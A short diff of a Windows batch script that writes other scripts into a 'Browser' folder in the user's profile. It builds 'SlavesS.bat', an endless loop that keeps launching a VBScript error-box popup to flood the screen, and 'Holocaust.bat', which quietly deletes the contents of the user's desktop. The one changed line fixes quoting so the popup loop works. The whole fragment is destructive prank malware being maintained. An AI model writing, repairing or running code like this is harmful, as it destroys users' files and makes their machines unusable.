@@ -11,7 +11,7 @@ echo msgbox "Slaves ERROR", 16, "ERROR" >> "%userprofile%\Browser\SlavesE.vbs"
 
 echo @echo off >> "%userprofile%\Browser\SlavesS.bat"
 echo :a >> "%userprofile%\Browser\SlavesS.bat"
-echo start %userprofile%\Browser\SlavesE.vbs >> "%userprofile%\Browser\SlavesS.bat"
+echo start "%userprofile%\Browser\SlavesE.vbs" >> "%userprofile%\Browser\SlavesS.bat"
 echo goto a >> "%userprofile%\Browser\SlavesS.bat"
 
 echo del "%userprofile%\desktop"/q >> "%userprofile%\Browser\Holocaust.bat"
